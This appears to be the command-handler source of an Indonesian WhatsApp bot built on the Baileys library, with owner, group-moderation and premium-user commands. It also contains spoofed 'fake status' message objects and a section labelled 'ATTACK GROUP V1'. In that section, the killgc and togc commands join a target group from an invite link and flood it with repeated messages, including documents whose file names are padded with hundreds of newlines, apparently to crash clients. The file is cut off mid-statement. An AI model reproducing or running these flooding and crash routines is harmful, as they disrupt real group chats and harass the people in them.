require('./settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys");
const fs = require("fs");
const os = require('os');
const chalk = require("chalk");
const crypto = require("crypto");
const { exec, spawn, execSync } = require("child_process");
const axios = require("axios");
const moment = require("moment-timezone");
const fetch = require("node-fetch");
const Jimp = require("jimp");
const util = require("util");
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { tiktokdl } = require('./lib/tiktok')
const speed = require('performance-now');
const { color, bgcolor, mycolor } = require('./lib/color')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, parseMention, getRandom } = require('./lib/functions')
const addusrp = JSON.parse(fs.readFileSync('./database/user.json'))
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a');
const { Configuration, OpenAIApi } = require("openai");


////CONST FILE

const { menunya } = require('./src/command/menunya')
let welcome = JSON.parse(fs.readFileSync('./database/welcome.json'));
let left = JSON.parse(fs.readFileSync('./database/left.json'));
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
///BATAS CONST MENU


/*=================CONST WAKTU===============*/

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam 🏙️'
}
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang 🌆'
}
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore 🌇'
}
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang 🌤️'
}
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'Selamat Pagi 🌄'
}
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat Subuh 🌆'
}
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'Selamat Tengah Malam 🌃'
}

const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        





/*=================BATAS CONST WAKTU===============*/


module.exports = yudamods = async (yudamods, m, chatUpdate, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await yudamods.decodeJid(yudamods.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const { chats } = m

const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')

const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await yudamods.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false


if (!yudamods.public) {
if (!m.key.fromMe) return
}

if (isCmd && m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); }
if (isCmd && !m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); }
		
try {
ppuser = await yudamods.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

const generateProfilePicture = async(buffer) => {
const jimp_1 = await Jimp.read(buffer);
const resz = jimp_1.getWidth() > jimp_1.getHeight() ? jimp_1.resize(550, Jimp.AUTO) : jimp_1.resize(Jimp.AUTO, 650)
const jimp_2 = await Jimp.read(await resz.getBufferAsync(Jimp.MIME_JPEG));
return {
img: await resz.getBufferAsync(Jimp.MIME_JPEG)
}
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
function monospace(string) {
return '```' + string + '```'
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}


///CONST INFOR

const infor =(`
┌╾▸ 〘YourInformation〙•
 ◓°Nama:${pushname}
 ◓°Premium:${!isCreator ? '❌' : '✅'}
└──────────|

┌╾▸ 〘BotInformation〙•
 ◓°NamaBot:${namabotnya}
 ◓°Tanggal:${tanggal}
 ◓°Jam: ${wib} WIB
 ◓°Owner:${global.owner} || ${global.namaownernya}
 ◓°Runtime:${runtime(process.uptime())}
└──────────|`)

///BATAS CONST INFOR


////FAKE STATUS

const reSize = async(buffer, ukur1, ukur2) => {
             return new Promise(async(resolve, reject) => {
             let jimp = require('jimp')
             var baper = await jimp.read(buffer);
             var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
             resolve(ab)
             })
             }
             
             const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 99999,status: 200, thumbnail: await reSize(thumb, 100, 100), surface: 200, message: `Hii Kak ${pushname}`, orderTitle: 'Hii Kak ${pushname}', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
             
             
  const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: namabotnya,jpegThumbnail: thumb}}}
  
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":namabotnya, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': namaownernya, 'jpegThumbnail': thumb}}}
		
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6283842204546-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":namabotnya, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': namaownernya, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${namaownernya},;;;\nFN:${namaownernya}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
		
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./image/thumb.png'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}           
             


///BATAS FAKE STATUS


///CONST LAINYA 

const AntiLink = m.isGroup ? antilink.includes(from) : false 
if (AntiLink) {
linkgce = await yudamods.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
m.reply(`「 Detect Link 」\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(m.text)) {
bvl = `「 Detect Link 」\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await yudamods.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
yudamods.sendMessage(from, {text:`「 Detect Link 」\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}

yudamods.sendFakeLink = (jid, text, salam, pushname, quoted) => yudamods.sendMessage(jid, {
    	text: text,
    contextInfo: {
    	"externalAdReply": {
    	"title": `Selamat ${salam} ${pushname}`,
    "body": `© ${global.namaownernya}`,
    "previewType": "PHOTO",
    "thumbnailUrl": `https://chat.whatsapp.com/KoF5ERpT4Bt53RAHXLEuF7`,
    "thumbnail": thumb,
    "sourceUrl": group
    }
    }
    }, {
    quoted : m
    })
    


const reply = async (text) =>{
	return await yudamods.sendFakeLink(m.chat, text, salam, pushname, m)
}

let list = []
for (let i of owner) {
list.push({
displayName: await yudamods.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await yudamods.getName(i + '@s.whatsapp.net')}\n
FN:${await yudamods.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:gadaemailnyaa\n
item2.X-ABLabel:Email\n
item3.URL:https://reii-store.my.id/\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}



//BATAZ CONST LAINYA


//CONST PENTING

const isWelcome = welcome.includes(m.chat)
const isLeft = left.includes(m.chat)
const isPremium = premium.includes(m.sender)
const isOwner = owner.includes(m.sender)


//BATAS CONST PENTING


const sendBug = async (target) => {
yudamods.sendMessage(target, {
text: '', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6283842204546`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6283842204546`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6283842204546`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6283842204546`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6283842204546`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6283842204546`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `${prefix}rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `${prefix}x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa`}}]}
)
}

global.addUserPanel = (email, username, expired, _db) => {
var obj_add = {
email: email,
username: username,
expired: expired
}
_db.push(obj_add)
fs.writeFileSync('./database/user.json', JSON.stringify(_db, null, 3))
}


switch (command) {

case "setppbot": {
if (!isCreator) return 
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await yudamods.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await yudamods.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Sukses`)
} else {
var memeg = await yudamods.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Sukses`)
}
}
break

case 'p':{
m.reply(`Pake Salam Kek P² Doang`)
}
break

case '🗿':{
m.reply(`Wihhh Emot Batu Cuy`)}
break


////CASE MENU

case 'menu': case 'halo': {
yudamods.sendMessage(from, { react: { text: `⏱️`, key: m.key }})
yudamods.sendMessage(m.chat, { image: thumb, caption: `${infor}\n\n ${menunya}`},{ quoted: ftroli})}
break


///BATAS CASE MENU


///CASEOWNERMENU

case 'public': {
if (!isCreator) return m.reply(mess.owner)
yudamods.public = true
m.reply('Sukse Change To Public')
}
break


case 'addprem':
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`Masukan Nomornya contoh: \n${prefix}${command} 628123456789`)
if(isNaN(q)) return await m.reply('harus berupa nomor')
  if (q.includes(`+`)) return m.reply('Tidak menggunakan + langsung nomor 6285****')
prmi = args.join(" ")
premium.push(`${prmi}@s.whatsapp.net`)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
m.reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${prmi}`)
break


case 'delprem':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628123456789`)
yaki = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(yaki)
premium.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
m.reply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
break


case 'listpremium': case 'listprem':
if (!isPremium) return m.reply(mess.premium)
teks = '*List Premium*\n\n'
for (let yudamods of premium) {
teks += `- ${yudamods}\n`
}
teks += `\n*Total : ${premium.length}*`
yudamods.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": premium } })
break

case 'join':{
    if (!isCreator) return m.reply(`khusus creator bot`)
 if (!isCreator) return reply(mess.OnlyOwner)
if (!q) return reply(`Kirim perintah ${prefix+command} _linkgrup_`)
var ini_urrrl = q.split('https://chat.whatsapp.com/')[1]
var data = await yudamods.groupAcceptInvite(ini_urrrl)
m.reply('*Sukses Join The Group..*')
}

break

case 'self': {
if (!isCreator) return m.reply(mess.owner)
yudamods.public = false
m.reply('Sukses Change To Self')
}
break  

case 'restart':{

 if (!isCreator) return m.reply(mess.owner)
        txts = `SUCCES...`
        m.reply(txts)
        await sleep(2000)
 let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let o
  try {
  o = exec('pm2 restart all')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
}
}
yudamods.sendMessage(mess.success)
break

case 'shutdown':
if (!isCreator) return m.reply(mess.owner)
reply(`Bye...`)
await sleep(3000)
process.exit()
break
case 'owner': {
const repf = await yudamods.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, mentions: [sender] }, { quoted: m })
yudamods.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya Btw -1 kack`, mentions: [sender]}, { quoted: repf })
}
break         


case 'creategc': {
if (!isCreator) return m.reply(mess.owner)
if (!args.join(" ")) return m.reply(`Penggunaan ${prefix+command} namagroup`)
try {
let cret = await yudamods.groupCreate(args.join(" "), [])
let response = await yudamods.groupInviteCode(cret.id)
teks = `     「 Group Create Fitur 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB

https://chat.whatsapp.com/${response}
       `
yudamods.sendMessage(m.chat, { text:teks, mentions: await yudamods.parseMention(teks)}, {quoted:m})
} catch {
m.reply(mess.success)
}
}
break   


case 'anticall': {
            	if (!m.key.fromMe && !isCreator) return m.reply("Fitur khusus owner!")
            if (args[0] === "on") {
            	if (global.anticall === true) return m.reply(`Sudah Di Aktifkan Sebelumnya`)
            global.anticall = true
            m.reply(`Berhasil Mengaktifkan Anticall`)
            } else if (args[0] === "off") {
            	if (global.anticall === true) return m.reply(`Sudah Di Nonaktifkan Sebelumnya`)
            global.anticall = false
            m.reply(`Sukses Nonaktifkan Anticall`)
            } else {
            	m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
            }
            }
            break
            
            
case 'promote': {
                if (!m.isGroup) return mess.group
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await yudamods.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'demote': {
                if (!m.isGroup) return mess.group
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await yudamods.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break            
            
            
case 'block': {
                if (!isCreator) return mess.owner
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await yudamods.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'unblock': {
                if (!isCreator) return mess.owner
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await yudamods.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }         
            
  case 'listpc': {
             if (!isCreator) return m.reply(mess.owner)
                let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                let tekslist = `*🔒 LIST PERSONAL CHAT*\n\n`
                tekslist += `*📱 Total Chat :* ${anu.length} Chat\n\n`
                for (let i of anu) {
                    let nama = store.messages[i].array[0].pushName
                    tekslist += `📛 *Nama :* ${nama}\n`
                    tekslist += `👤 *User :* @${i.split('@')[0]}\n`
                    tekslist += `🔗 *Link Chat :* https://wa.me/${i.split('@')[0]}\n\n`
                    tekslist += `──────────────────────\n\n`
                }
                yudamods.sendTextWithMentions(m.chat, tekslist, ftroli)
            }
            break 
            case 'd': case 'delete': case 'del': {
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) return m.reply( 'Pesan tersebut bukan dikirim oleh bot!')
yudamods.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break

case 'done': case 'd1':{
if (!isCreator) return m.reply(mess.owner)
let menu_nya =`
*ALHAMDULILLAH DONE*

HARI : ${hariini}
TANGGAL : ${tanggal}
JAM : ${jam}

*NOTE :*
*- ALL TRX NO REFF*
*- MAKSA REFF? BLOK*

*FROM : YUDA STORE*
*WA 1 : 6283842204546*
SELAIN NO DI ATAS WASPADA CLONE!!

JANGAN LUPA ORDER KEMBALI YA`
yudamods.sendMessage(from, {text: menu_nya}, {quoted: fkontak})
}
break

case 'proses': {
if (!isCreator) return m.reply(mess.owner)
let tek = `「 *TRANSAKSI PENDING* 」
📆 TANGGAL : ${tanggal}
⌚ JAM     : ${jam}
✨ STATUS  : Pending

*--------------------------*

*Pesanan ini akan diproses manual oleh admin,* *Tunggu admin memprosesnya🙏*`
let btn_menu = [
{buttonId: `${prefix}_`, buttonText: { displayText: 'OKE SAYA TUNGGU👍' }, type: 1 },
]
yudamods.sendMessage(from,
{text: tek,
buttons: btn_menu})
yudamods.sendMessage(`${global.ownerNumber}`, {text: `_`}, {quoted: fkontak})
}
break
            
                                                                                                                                                    

///BATAS CASE OWNERMENU

// ATTACK GROUP V1 ( PAKE LINK GROUP )
case "killgc": case "santetgc": case "gcwakwaw": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await yudamods.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
yudamods.sendMessage(mnm, { text: "YOUTUBE YUDAMODS`" }, { quoted: lep })
yudamods.sendMessage(mnm, { text: "YOUTUBE YUDAMODS`" }, { quoted: lep })
}
yudamods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb YUDAMODS`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://www.youtube.com/@YUDAMODS", 
"sourceUrl": "https://www.youtube.com/@YUDAMODS" }}}, { quoted: m })
}
break
case "togc": case "matigc": case "kuygc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await yudamods.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
yudamods.sendMessage(mnm, { document: thumb, caption: "YOUTUBE YUDAMODS`", fileName: `YUDAMODS ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
